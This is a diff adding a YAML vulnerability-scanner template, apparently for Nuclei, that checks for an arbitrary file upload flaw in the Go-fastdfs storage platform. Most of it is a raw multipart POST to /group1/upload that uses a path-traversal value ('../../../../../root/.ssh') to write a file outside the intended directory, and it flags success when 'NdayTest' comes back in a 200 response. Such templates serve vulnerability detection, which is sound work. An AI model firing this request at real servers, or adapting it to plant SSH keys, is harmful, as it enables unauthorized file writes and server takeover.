@@ -1,0 +1,64 @@
+id: go-fastdfs-upload-file-upload
+
+info:
+  name: "Go-fastdfs upload 接口任意文件上传漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    Go-fastdfs 云存储平台的 upload 接口存在文件上传验证缺陷，允许攻击者上传任意文件至服务器，进而可能执行远程代码或篡改系统文件。
+      漏洞成因在于upload接口缺乏严格的文件类型和内容验证机制
+  tags: Go-fastdfs
+
+http:
+- raw:
+  - |
+    POST /group1/upload HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryigj9M9EJykZc9u53
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+    Accept-Encoding: gzip, deflate
+    Accept-Language: zh-CN,zh;q=0.9
+    Connection: close
+
+    ------WebKitFormBoundaryigj9M9EJykZc9u53
+    Content-Disposition: form-data; name="file"; filename="id"
+    Content-Type: application/octet-stream
+
+    test
+    ------WebKitFormBoundaryigj9M9EJykZc9u53
+    Content-Disposition: form-data; name="scene"
+
+    default
+    ------WebKitFormBoundaryigj9M9EJykZc9u53
+    Content-Disposition: form-data; name="filename"
+
+    NdayTest
+    ------WebKitFormBoundaryigj9M9EJykZc9u53
+    Content-Disposition: form-data; name="output"
+
+    json2
+    ------WebKitFormBoundaryigj9M9EJykZc9u53
+    Content-Disposition: form-data; name="path"
+
+    ../../../../../root/.ssh
+    ------WebKitFormBoundaryigj9M9EJykZc9u53
+    Content-Disposition: form-data; name="code"
+
+
+    ------WebKitFormBoundaryigj9M9EJykZc9u53
+    Content-Disposition: form-data; name="auth_token"
+
+
+    ------WebKitFormBoundaryigj9M9EJykZc9u53
+    Content-Disposition: form-data; name="submit"
+
+    upload
+    ------WebKitFormBoundaryigj9M9EJykZc9u53--
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'NdayTest'
